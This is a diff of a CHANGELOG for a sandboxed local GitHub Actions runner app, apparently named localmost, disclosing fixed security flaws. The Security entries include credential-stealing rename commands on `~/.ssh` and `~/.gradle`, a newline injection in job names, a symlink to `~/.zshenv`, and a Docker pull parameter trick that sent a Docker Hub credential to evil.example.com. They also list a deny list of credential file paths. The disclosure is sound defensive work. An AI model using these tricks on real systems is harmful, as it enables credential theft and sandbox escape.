@@ -174,11 +174,13 @@ Theme: Test Locally, Secure by Default. Catch workflow problems before pushing, 
   like keeps the rest of what it covers.
 - The approval screen and `localmost policy show` mark a write grant that
   reaches past the job - LaunchAgents and LaunchDaemons, shell rc files,
-  `~/.ssh`, `~/.gitconfig`, `~/.config`, `~/Library/Application Support` and
-  the common PATH directories (`/usr/local/bin`, `/opt/homebrew/bin`,
-  `~/.local/bin`, `~/bin`) - with what a write there lets a job do: leave code
-  that runs as you, outside the sandbox, after the job ends. Such grants are
-  still allowed.
+  `~/.gitconfig`, `~/Library/Application Support`, the package caches
+  `~/.gradle`, `~/.m2`, `~/.cargo` and `~/.nuget`, and the common PATH
+  directories (`/usr/local/bin`, `/opt/homebrew/bin`, `~/.local/bin`,
+  `~/bin`) - with what a write there lets a job do: leave code that runs as
+  you, outside the sandbox, after the job ends. Such grants are still allowed. A
+  write grant on `~/.ssh` or `~/.config` is marked as doing nothing, since the
+  sandbox refuses every write there whatever is granted.
 - A job's Docker `/info` shows only the daemon's version, platform, kernel, CPU
   count, memory, storage driver, cgroup version and security options. In full
   it described the host: its name, the daemon's proxy URLs with any credentials
@@ -255,8 +257,136 @@ Theme: Test Locally, Secure by Default. Catch workflow problems before pushing, 
   to accounts and lists the rest as anonymous. Repositories
   this scope admitted before can now be refused; the refusal names the
   unattributed commit, email or name.
+- The credentials no job reaches - `~/.ssh`, `~/.aws`, `~/.gnupg`, `~/.kube`,
+  `~/.docker`, `~/.config`, `~/Library/Keychains`, `~/.netrc`, `~/.npmrc` and
+  the credential files inside the package caches (`~/.m2/settings.xml`,
+  `~/.gradle/gradle.properties`, cargo's credentials, `NuGet.Config`) - are
+  denied to a runner job and a `localmost test` step for writes as well as
+  reads, at every level and whatever the policy grants, and the directories
+  above each are closed to writes, so none can be renamed out from under the
+  deny. They were denied to reads only, so a write grant that covered one let
+  a job rename it, or the directory it sits in, to a name the grants covered
+  and read it there: with write on `~/.gradle`,
+  `mv ~/.gradle/gradle.properties ~/.gradle/p2` printed the secret, which
+  every later `moderate` job could then read too, and with write on `~`,
+  `mv ~/.ssh ~/.sshx` exposed the SSH keys. Each is also denied by the path
+  it resolves to when the job starts, so one a dotfile manager links into
+  place (`~/.aws` linked to `~/dotfiles/aws`, say) is not read or renamed
+  through the link.
+- The same floor now names these files, where developer tools keep tokens and
+  passwords in plain text: `~/.azure` (the Azure CLI's token cache),
+  `~/.git-credentials`, `~/.pypirc`, `~/.gem/credentials` and
+  `~/.local/share/gem/credentials`, `~/.terraform.d/credentials.tfrc.json`,
+  `~/.terraformrc`, `~/.pgpass`, `~/.vault-token`, `~/.boto`, `~/.s3cfg`,
+  `~/.my.cnf`, `~/.mylogin.cnf`, `~/.yarnrc.yml`, and Hugging Face's
+  `~/.cache/huggingface/token` and `stored_tokens`. A policy granting read of
+  `~` read them all, and `moderate`, which reads `~/.local` and `~/.cache` as
+  toolchain trees, read the RubyGems push key and the Hugging Face tokens with
+  no grant at all. The directories they sit in stay as granted: installed
+  gems, Terraform's plugin cache and the Hugging Face model cache are still
+  there for a job to use.
+- A job ends when its worker exits, not when a completion line is read. The
+  runner prints the job's name, which the workflow spells, in that line, so a
+  name carrying a newline and `Job b completed with result: Succeeded` closed
+  its job with the result it chose as soon as the job started: the worker was
+  shown idle while the job ran on, Cancel went away, sleep protection and the
+  quit confirmation turned off, a policy change retired the worker as idle,
+  and the job's real result was never recorded. GitHub's conclusion now
+  decides the result, and without one a signal or a stop reads as cancelled
+  and an error exit as failed; the last completion line read can only turn a
+  clean exit into a failure or a cancel. A job whose worker the app stops in
+  the moment before it exits, with no conclusion from GitHub yet, reads as
+  cancelled.
+- A `localmost test` workspace holds copies of the checkout's files - APFS
+  clones where the volume can make them - rather than hard links to them, so
+  a step, including one a third-party action runs, can no longer write the
+  checkout's own files, its `.localmostrc` and build scripts among them. The
+  files come from `git ls-files` with the checkout's ignore rules: rsync read
+  a `.gitignore` line of only `!` as "forget every rule so far" and copied
+  `.git` in. A submodule or nested repository is held to its own rules and
+  the checkout's, where it was copied whole, a `.env` or credential file it
+  ignores included; `--staged` no longer copies a nested repository's `.git`,
+  or the contents of the file a tracked link points to. If git cannot list
+  the files, the run is refused, naming `--no-ignore`. The workspace's
+  metadata is written into the empty workspace before the copy, so an entry
+  of the checkout's at that name, in any case or spelling the volume folds to
+  it, never replaces it or has it written through a link; and a workspace is
+  dated by its name rather than by its metadata, which a step could rewrite
+  to keep the workspace past the cleanup limits, or replace with a FIFO that
+  stalled every later run.
+- `localmost test` and the `localmost policy` commands refuse a
+  `.localmostrc` that is a link, dangling or not, a directory, a device or a
+  FIFO, and `--updaterc` and `policy init` write one by renaming a new file
+  over it, never through a link. A
+  checkout committing `.localmostrc -> ../../.zshenv` had an approved
+  `--updaterc` create `~/.zshenv` holding a workflow name the shell would
+  expand, and a link to `/dev/zero` or a FIFO hung every command on the read.
+  The `--updaterc` confirmation names the file it will write and lists a new
+  policy's workflows entry with the other additions.
+- The Docker filter holds a pull's `tag` parameter, however its name is
+  cased, to a tag or a digest. Podman joins the tag to `fromImage` with `:`, so
+  `fromImage=localhost&tag=5000/x` pulled `localhost:5000/x`, and
+  `fromImage=evil.example.com&TAG=443/x` pulled from `evil.example.com:443`,
+  each approved under `docker.io` and sent with the operator's Docker Hub
+  credential.
+- A repository URL is read whole, as `https://github.com/<owner>/<repo>` with
+  an optional `.git` and trailing slash. Five places read it with a pattern
+  that stopped the repository name at its first dot and matched
+  `github.com/` anywhere in the string: configuring a runner for
+  `https://github.com/o/my.repo` registered it with `o/my`'s token, as did
+  re-registering a configuration saved for it, and
+  `https://evil.example/github.com/o/r` named `o/r`. A configuration saved
+  for an older account whose name GitHub no longer issues - one ending in a
+  hyphen, say - still re-registers, and a settings change still saves it. In
+  `localmost test`, an action ref naming a repository that ends in `.git`
+  (`uses: o/r.git@v1`) is refused, since GitHub strips that suffix from every
+  repository's name.
+- Registration runs `config.sh` in a directory of its own, made with a unique
+  name and mode 0700, and the startup sweep removes any that a quit or crash
+  left. Each interrupted registration left its copy of the runner, about
+  430 MB, with the registration's key (`.credentials_rsaparams`) beside it,
+  in a directory made with the umask's mode rather than one only the app can
+  open.
+- The `localmost` command runs the `cli.js` bundled with the app, found by
+  following the command's link to the real script. It ran the `cli.js` in
+  the link's own directory, `/usr/local/bin`, where none is installed, so
+  every command failed with "Cannot find module", and one placed there would
+  have run instead; run as `sh localmost`, it ran a `cli.js` in the working
+  directory, as a cloned checkout has. The command runs with the `node` first
+  on `PATH`, so it needs Node.js.
+- The app is signed with only the entitlements Electron needs: `cs.allow-jit`
+  on the app, its main, GPU and renderer helpers and ShipIt, the plugin
+  helper's two `cs.*` exceptions, and none on the camera helper. Releases
+  through 0.2.0 carried @electron/osx-sign's defaults - camera, microphone,
+  USB, Bluetooth, printing and location - on the app, its main helper and
+  ShipIt, since the signing options meant to replace them were ignored. A
+  signing failure now stops the build, where it shipped unsigned or partly
+  signed code.
+- Pause during video calls runs the camera helper shipped in the app's
+  `Contents/Resources`, signed with the hardened runtime and no entitlements.
+  The packaged app ran the helper from the build machine's path
+  (`/Users/<builder>/.../node_modules/is-camera-on/`), unsandboxed: on any
+  other Mac the detection silently did nothing, and on one where that path
+  existed it ran whatever was there. Stopping the monitor now stops the
+  helper, which ran on until the camera next changed.
 
 ### Fixed
+- In-app updates install. The update feed listed only the DMGs, and the
+  updater installs only from a zip, so every download failed with
+  `ERR_UPDATER_ZIP_FILE_NOT_FOUND`. Each release now ships a zip for each
+  architecture, listed in the feed ahead of the DMGs.
+- `localmost policy init --force` replaces an existing policy. The flag was
+  read and ignored, while the refusal without it said to pass it.
+- The tray shows an expired GitHub session as "GitHub: Session expired,
+  reconnect in Settings", as the Settings badge does, with no Pause or
+  Resume. It showed the runner listening, with a Pause item, for a session
+  that could not get a token, and it now redraws when the session expires.
+- `localmost test --updaterc` runs inside a runner job. Its process watcher
+  was written to `~/.localmost/bin` first, which a job cannot write, so
+  every step failed there; it is now passed to Python on its command line.
+- A registration GitHub has made is no longer reported as failed because its
+  working directory could not be removed, and `config.sh`'s own error, or the
+  runner's integrity failure, is no longer hidden behind the removal's.
 - A run that could not be cancelled says so. When admission refuses a job and
   GitHub will not cancel its run, the job's history entry records "cancel
   failed" with the reason and, when job notifications are on, a "Cancel Failed"
@@ -316,6 +446,22 @@ Theme: Test Locally, Secure by Default. Catch workflow problems before pushing, 
   8443, SSH tunnelled through the proxy - needs a `host:port` entry (or
   `[v6-address]:port`) in its `network.allow`, which allows that port only.
   `permissive` is unchanged
+- **Breaking**: the credential floor holds against write grants (see
+  Security). A job granted `~` can no longer create a missing `~/.gradle`,
+  `~/.m2`, `~/.cargo`, `~/.nuget`, `~/.gem`, `~/.terraform.d`, `~/.local` or
+  `~/.cache`, nor one granted `~/.local` a missing `~/.local/share` or
+  `~/.local/share/gem`, nor one granted `~/.cache` a missing
+  `~/.cache/huggingface`: create the directory yourself, and the grant writes
+  in it. So `gem install --user-install` fails where it would create
+  `~/.gem`, or, on RubyGems 3.4 and later under `strict`,
+  `~/.local/share/gem`. A write grant on `~/.ssh` writes nothing there,
+  `~/.ssh/known_hosts` included. A step granted `~` that logs in by writing
+  a credential file - `az login` and `azure/login` (`~/.azure`),
+  `hashicorp/setup-terraform` with `cli_config_credentials_token`
+  (`~/.terraformrc`) - fails with "Operation not permitted" rather than
+  overwrite your own login; point the tool at a file in the workspace with
+  `AZURE_CONFIG_DIR` or `TF_CLI_CONFIG_FILE`. The files the floor newly names
+  cannot be read or written whatever the policy grants
 - **Breaking**: a runner job can signal only processes in its own sandbox - its
   children and the members of its process group that share it. Stopping or
   killing a process it did not start - a server or app you launched, another
